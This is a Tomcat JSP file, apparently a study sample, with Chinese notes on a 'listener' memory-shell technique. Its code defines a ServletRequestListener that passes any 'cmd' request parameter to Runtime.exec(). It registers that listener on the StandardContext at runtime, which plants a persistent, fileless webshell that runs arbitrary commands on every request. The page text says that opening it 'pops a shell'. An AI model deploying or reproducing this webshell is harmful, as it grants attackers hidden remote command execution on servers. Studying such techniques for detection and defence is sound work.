<%--
  Created by IntelliJ IDEA.
  User: ThreatBook
  Date: 2023/6/27
  Time: 17:41
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.loader.WebappClassLoaderBase" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
>

<%!
    public class Shell_Listener implements ServletRequestListener {

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            String cmd = req.getParameter("cmd");
            if (cmd != null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e){
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {}
    }
%>
<%
    WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

    Shell_Listener shell_listener = new Shell_Listener();
    standardContext.addApplicationEventListener(shell_listener);
%>



<html>
<head>
    <title>Listener 02版</title>
</head>
<body>
    <br>普通jsp直接页面返回！！<br>
    <br>注意点：使用war形式 + 配置前后缀，直接访问jsp页面!!!    即可弹shell！！！<br>


    <h3>在jsp中如何获得StandardContext对象:</h3>

    <h5>方式二：</h5>
    <p>
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();<br>
    </p>
</body>
</html>
